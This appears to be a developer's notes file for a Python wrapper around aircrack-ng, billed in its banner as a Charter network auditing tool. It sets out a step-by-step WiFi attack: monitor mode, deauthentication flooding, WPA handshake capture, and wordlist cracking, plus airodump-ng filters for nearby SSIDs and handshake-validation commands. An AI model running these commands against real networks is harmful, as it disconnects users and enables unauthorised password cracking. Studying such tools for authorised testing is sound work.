!MUST RUN AS ROOT!


Airmon-ng --write DOES NOT PROVIDE ALL DETAILS THAT ARE SEEN IN THE TERMINAL
THEREFORE I AM USING WASH AS A WAY TO GATHER NETWORK INFORMATION

Python System Calls:
import subprocess

PYTHON 2.7
subprocess.call(['command','option'])
ex: subprocess.call(['ls','-l'])

PYTHON 3
subprocess.run('command') or subprocess.run(['command','option'])

SUBPROCESS NOTES:
* Capture STD_OUT from subprocess.run('~', cature_output.True)
>>> proc = subprocess.Popen('ls', stdout=subprocess.PIPE)
>>> output = proc.stdout.read()
>>> print output
bar
baz
foo
----------------
Better use of subprocess:
* Capture output of run(), save to variable, then run checks
proccess1 = subprocess.run(['ls','-lsa'], capture_output=True, text=True)
print(proccess1.stdout)

Aircrack-ng Process:
0. ROOT USER - MUST RUN SCRIPT AS ROOT
1. airmon-ng check kill - KILLS INTERFERING PROCESSES
2. airmon-ng start wlan0 - SETS WIRELESS CARD TO MONITOR MODE
3. airodump-ng wlan0mon - SCANS FOR NEARBY NETWORKS
4. FIND NETWORK TO ATTACK
5a. airodump-ng --bssid 00:01:02:03:04:05 -w FILENAME wlan0mon
5b. aireplay-ng --deauth 100 -a 00:01:02:03:04:05 -c 00:01:02:03:04:05 wlan0mon
5c. PERFORM 5a AND 5b AT SAME TIME
6. CAPTURE HANDSHAKE BETWEEN DEVICE AND TARGET NETWORK
7. aircrack-ng -w WORDLIST FILENAME.cap

Airodump-ng Notes:
sudo airodump-ng -R '(TCC.)' -w test --output-format csv wlan0mon
sudo airodump-ng -R '(MyCharterWiFi)' -w myOutput --output-format csv wlan0mon
ROOT airodump-ng -R '[REGEX]' -w [OUTPUTFILE] --output-format [FILETYPE] [INTERFACE]

WORKS:sudo airodump-ng -R '(My.)' -w targetstest --output-format csv wlan0mon


Other:
New Kali 2020.1 - not root as default
		- users must run script as root

Handshake Verification:
***Requirements***:
*Kali
*.CAP file

Okay, so when capturing a handshake, you can sometimes capture a incomplete handshake. It will come up as if you captured one, but you will be unable to brute force it. So instead of wasting hours of your time brute forcing the handshake, I will show you two methods on how to check if its valid before you go ahead and brute force.

Method 1: Cowpatty

1.) Open up CMD and type in the following command:
CODE:
cowpatty -c -r FONHandShake.cap
REPLACE FONHandShake.cap WITH THE NAME OF YOUR .CAP FILE WHICH SHOULD BE IN THE HOME DIRECTORY.

Once you run that command you should get the results of the quality of the handshake.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------

Method 2: Pyrit

1.) In CMD type the following command
CODE:
pyrit -r FONHandShake.cap analyze
REPLACE FONHandShake.cap WITH THE NAME OF YOUR .CAP FILE WHICH SHOULD BE IN THE HOME DIRECTORY.

You will get the results which will state if the handshake is good or not(good/workable/bad).
If you have a good quality handshake it should have the word "Good" in there.

TODO:
* Find clients
* Verify handshakes



MISC:
print('          ▀▀▀██████▄▄▄          ')
print('                 ▀▀▀████▄       ')
print('          ▄███████▀   ▀███▄     ')
print('        ▄███████▀       ▀███▄   ')
print('      ▄████████           ███▄  ')
print('     ██████████▄           ███▌   ██████╗ ██╗   ██╗██████╗     ███████╗██████╗ ███████╗ ██████╗████████╗██████╗ ██╗   ██╗███╗   ███╗    ██╗    ██╗██╗███████╗██╗')
print('     ▀█████▀ ▀███▄         ▐███  ██╔═══██╗██║   ██║██╔══██╗    ██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██║   ██║████╗ ████║    ██║    ██║██║██╔════╝██║')
print('       ▀█▀     ▀███▄       ▐███  ██║   ██║██║   ██║██████╔╝    ███████╗██████╔╝█████╗  ██║        ██║   ██████╔╝██║   ██║██╔████╔██║    ██║ █╗ ██║██║█████╗  ██║')
print('                 ▀███▄     ███▌  ██║   ██║██║   ██║██╔══██╗    ╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══██╗██║   ██║██║╚██╔╝██║    ██║███╗██║██║██╔══╝  ██║')
print('    ▄██▄           ▀███▄  ▐███   ╚██████╔╝╚██████╔╝██║  ██║    ███████║██║     ███████╗╚██████╗   ██║   ██║  ██║╚██████╔╝██║ ╚═╝ ██║    ╚███╔███╔╝██║██║     ██║')
print('  ▄██████▄           ▀███▄███     ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝')
print(' █████▀▀████▄▄        ▄█████    ')
print(' ████▀   ▀▀█████▄▄▄▄█████████▄  ')
print('  ▀▀         ▀▀██████▀▀   ▀▀██  ')  


	░░░░░░░░░░▀▀▀██████▄▄▄░░░░░░░░░░ 
	░░░░░░░░░░░░░░░░░▀▀▀████▄░░░░░░░ 
	░░░░░░░░░░▄███████▀░░░▀███▄░░░░░ 
	░░░░░░░░▄███████▀░░░░░░░▀███▄░░░ 
	░░░░░░▄████████░░░░░░░░░░░███▄░░ 
	░░░░░██████████▄░░░░░░░░░░░███▌░ 
	░░░░░▀█████▀░▀███▄░░░░░░░░░▐███░ 
	░░░░░░░▀█▀░░░░░▀███▄░░░░░░░▐███░ 
	░░░░░░░░░░░░░░░░░▀███▄░░░░░███▌░ 
	░░░░▄██▄░░░░░░░░░░░▀███▄░░▐███░░ 
	░░▄██████▄░░░░░░░░░░░▀███▄███░░░ 
	░█████▀▀████▄▄░░░░░░░░▄█████░░░░ 
	░████▀░░░▀▀█████▄▄▄▄█████████▄░░ 
	░░▀▀░░░░░░░░░▀▀██████▀▀░░░▀▀██░░

    print(Fore.BLUE)
    print(' ,--------------------------.')
    print('( Change Your WiFi Password! )   .-.')
    print(' `--------------------------\'     \ \\')
    print('       (_)                         \ \\')
    print('           O                       | |')
    print('             o                     | |    ██████╗        █████╗        ████████╗')
    print('               . /\---/\   _,---._ | |   ██╔════╝       ██╔══██╗       ╚══██╔══╝')
    print("                /^   ^  \,'       \'. ;   ██║            ███████║          ██║   ")
    print('               ( O   O   )           ;   ██║            ██╔══██║          ██║   ')
    print("                `.=o=__,'            \\   ╚██████╗██╗    ██║  ██║██╗       ██║██╗")
    print('                  /         _,--.__   \\   ╚═════╝╚═╝    ╚═╝  ╚═╝╚═╝       ╚═╝╚═╝')
    print("                 /  _ )   ,'   `-. `-. \\     Charter(networks) Auditing Tool")
    print("                / ,' /  ,\'        \ \ \ \             by Edward Ayala")
    print("               / /  / ,'          (,_)(,_)")
    print('              (,;  (,,)')                                                                             
    print(Style.RESET_ALL)